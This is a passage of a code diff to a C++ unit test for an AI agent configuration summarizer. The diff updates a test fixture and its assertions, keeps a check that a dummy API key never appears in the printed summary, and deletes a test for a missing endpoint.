 	fs::path cfg = tmp.path() / "llm.json";
 	writeFile(cfg, R"({
-	  "endpoint": "http://127.0.0.1:1/v1/chat/completions",
-	  "model": "m-check",
-	  "api_key": "sk-SECRET-DO-NOT-LEAK"
+	  "api_key": "sk-SECRET-DO-NOT-LEAK",
+	  "scripts_dir": "myscripts",
+	  "run_command_timeout_sec": 30
 	})", fs::perms::owner_all);
 
 	AgentModeConfig out;
@@ -1345,28 +916,13 @@ TH_TEST(agentconfig_summary_reports_config_without_leaking_key) {
 	const std::string s = summarizeAgentConfig(out);
 
 	TH_CHECK(s.find("配置校验通过") != std::string::npos);
-	TH_CHECK(s.find("http://127.0.0.1:1/v1/chat/completions") != std::string::npos);
-	TH_CHECK(s.find("m-check") != std::string::npos);
-	TH_CHECK(s.find("LlmOpenAI") != std::string::npos);
-	TH_CHECK(s.find("scripts") != std::string::npos);
-	/* 密钥只报来源、不报值——摘要会被打印进终端与 CI 日志 */
+	/* 后端工具面真实生效的字段 */
+	TH_CHECK(s.find("myscripts") != std::string::npos);		/* 动作脚本目录 */
+	TH_CHECK(s.find("run_command=30s") != std::string::npos);	/* 工具超时 */
+	TH_CHECK(s.find("relay-test.sql") != std::string::npos);	/* 结构脚本 */
+	/* 配置文件里的密钥值绝不进摘要 */
 	TH_CHECK_MSG(s.find("sk-SECRET-DO-NOT-LEAK") == std::string::npos,
 		"摘要泄露了 API key: " + s);
-	TH_CHECK(s.find("配置文件 api_key 字段") != std::string::npos);
-}
-
-TH_TEST(agentconfig_summary_flags_missing_endpoint) {
-	NoKeyEnv nokey;
-	TempDir tmp("check-config-nourl");
-	fs::path cfg = tmp.path() / "llm.json";
-	writeFile(cfg, R"({ "api_key": "sk-x" })", fs::perms::owner_all);
-
-	AgentModeConfig out;
-	std::string err;
-	TH_CHECK_MSG(buildAgentConfig(baseOptions(cfg.string()), out, err), err);
-	const std::string s = summarizeAgentConfig(out);
-	/* B2 起不再有内置缺省接入点：空 = 首次调用必然失败，摘要必须说出来 */
-	TH_CHECK_MSG(s.find("未配置，首次调用将失败") != std::string::npos, s);
 }
 
 /* ---- 2026-09-25：--on-disconnect 的上电前预检 ----
